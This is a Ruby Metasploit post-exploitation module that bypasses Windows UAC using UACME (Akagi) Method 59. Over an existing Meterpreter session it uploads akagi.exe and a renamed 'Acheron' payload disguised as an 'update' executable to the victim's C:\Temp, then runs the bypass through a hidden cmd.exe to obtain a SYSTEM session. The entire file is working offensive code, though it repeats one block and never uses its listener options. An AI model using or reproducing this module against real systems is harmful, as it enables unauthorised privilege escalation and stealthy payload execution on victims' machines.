##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows UAC Bypass via Akagi Method 59',
      'Description'   => %q{
        UAC bypass using Akagi (UACME) Method 59 - Debug Object / PPID Spoofing.
        
        This module:
        1. Finds existing Acheron payload on attacker
        2. Renames it with random name
        3. Uploads akagi.exe + payload to victim's C:\Temp
        4. Executes: akagi.exe 59 <payload_path>
        
        Requires akagi.exe on attacker machine (UACME compiled binary).
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Acheron Toolkit' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
        [
          [ 'URL', 'https://github.com/hfiref0x/UACME' ],
          [ 'URL', 'https://github.com/f1zm0/acheron' ]
        ]
    ))

    register_options(
      [
        OptString.new('LHOST', [ true, 'Listener IP for payload', '0.0.0.0' ]),
        OptInt.new('LPORT', [ true, 'Listener port for payload', 4445 ]),
        OptString.new('AKAGI_PATH', [ false, 'Path to akagi.exe on attacker', '/home/giovi/akagi.exe' ]),
        OptString.new('PAYLOAD_NAME', [ false, 'Custom payload name (random if empty)', '' ])
      ])
  end

  def run
    print_status("Starting UAC Bypass via Akagi Method 59")

    # Check if we're already SYSTEM
    if is_system?
      print_good("Already running as SYSTEM")
      return
    end

    # Generate random payload name
    payload_name = datastore['PAYLOAD_NAME'].empty? ? "update_#{Time.now.to_i}_#{rand(1000..9999)}.exe" : datastore['PAYLOAD_NAME']

    # FIND AND COPY the existing Acheron payload
    print_status("Searching for existing Acheron payload...")
    existing_payload = find_existing_acheron_payload
    
    unless existing_payload && ::File.exist?(existing_payload)
      print_error("No existing Acheron payload found!")
      return
    end

    # COPY and RENAME the existing payload
    print_status("Copying existing payload to #{payload_name}...")
    ::FileUtils.cp(existing_payload, "/tmp/#{payload_name}")
    
    unless ::File.exist?("/tmp/#{payload_name}")
      print_error("Failed to copy payload")
      return
    end

    print_good("Copied #{existing_payload} -> /tmp/#{payload_name}")

    # Get akagi.exe path
    akagi_local = datastore['AKAGI_PATH']
    unless ::File.exist?(akagi_local)
      print_error("akagi.exe not found at #{akagi_local}")
      print_error("Set AKAGI_PATH option or place akagi.exe at default location")
      return
    end
    
    print_status("Using akagi.exe from #{akagi_local}")
    print_status("File size: #{::File.size(akagi_local)} bytes")

    # COPY and RENAME the existing payload (again for local copy)
    payload_name = datastore['PAYLOAD_NAME'].empty? ? "update_#{Time.now.to_i}_#{rand(1000..9999)}.exe" : datastore['PAYLOAD_NAME']
    print_status("Copying existing payload to #{payload_name}...")
    ::FileUtils.cp(existing_payload, "/tmp/#{payload_name}")
    
    unless ::File.exist?("/tmp/#{payload_name}")
      print_error("Failed to copy payload")
      return
    end

    print_good("Copied #{existing_payload} -> /tmp/#{payload_name}")

    # Use C:\Temp on victim
    akagi_remote = "C:\\\\Temp\\\\akagi.exe"
    payload_remote = "C:\\\\Temp\\\\#{payload_name}"

    print_status("Using target directory: C:\\Temp")

    # Create C:\Temp directory on target
    print_status("Creating C:\\Temp directory on target...")
    session.fs.dir.mkdir("C:\\Temp") rescue nil

    # Verify local files exist
    unless ::File.exist?(akagi_local) && ::File.readable?(akagi_local)
      print_error("Local akagi.exe not readable: #{akagi_local}")
      return
    end
    
    print_status("Local akagi.exe verified: #{akagi_local} (#{::File.size(akagi_local)} bytes)")

    # Upload akagi.exe via meterpreter upload command
    print_status("Uploading akagi.exe via meterpreter upload command...")
    session.console.run_single("upload #{akagi_local} 'C:\\\\Temp\\\\akagi.exe'")
    print_good("akagi.exe uploaded successfully")

    # Verify upload
    begin
      stat = session.fs.file.stat("C:\\\\Temp\\\\akagi.exe")
      print_good("akagi.exe uploaded successfully (#{stat.size} bytes)")
    rescue => e
      print_error("Upload verification failed: #{e.message}")
      return
    end

    # Upload renamed payload to victim
    print_status("Uploading payload #{payload_name} via meterpreter upload command...")
    session.console.run_single("upload /tmp/#{payload_name} 'C:\\\\Temp\\\\#{payload_name}'")
    print_good("Payload uploaded successfully")

    # Verify payload upload
    begin
      stat = session.fs.file.stat("C:\\\\Temp\\\\#{payload_name}")
      print_good("Payload uploaded successfully (#{stat.size} bytes)")
    rescue => e
      print_error("Payload upload verification failed: #{e.message}")
      return
    end

    # Execute UAC bypass using akagi.exe Method 59
    print_status("Executing Akagi Method 59 on victim...")
    print_status("Executing: C:\\\\Temp\\\\akagi.exe 59 C:\\\\Temp\\\\#{payload_name}")
    
    # Execute via shell command
    cmd = "C:\\\\Temp\\\\akagi.exe 59 C:\\\\Temp\\\\#{payload_name}"
    result = session.sys.process.execute("cmd.exe", "/c #{cmd}", { 'Hidden' => true, 'Channelized' => true })

    # Clean up local temp files
    ::File.delete("/tmp/#{payload_name}") if ::File.exist?("/tmp/#{payload_name}")

    print_good("Akagi Method 59 executed! Check for new SYSTEM session.")
  end

  def find_existing_acheron_payload
    # Look for Acheron payloads in common locations - use environment variables
    search_paths = [
      ENV['ACHERON_TOOLKIT_DIR'] || '/root/acheron-toolkit/',
      ENV['HOME'] + '/acheron-toolkit/',
      '/tmp/acheron-gen/',
      ENV['HOME'] + '/',
      '/root/',
      Dir.pwd
    ]

    search_paths.each do |path|
      Dir.glob(File.join(path, 'acheron_*.exe')).each do |f|
        if ::File.exist?(f) && ::File.size(f) > 100000  # At least 100KB
          print_status("Found existing payload: #{f} (#{::File.size(f)} bytes)")
          return f
        end
      end
    end
    return nil
  end
end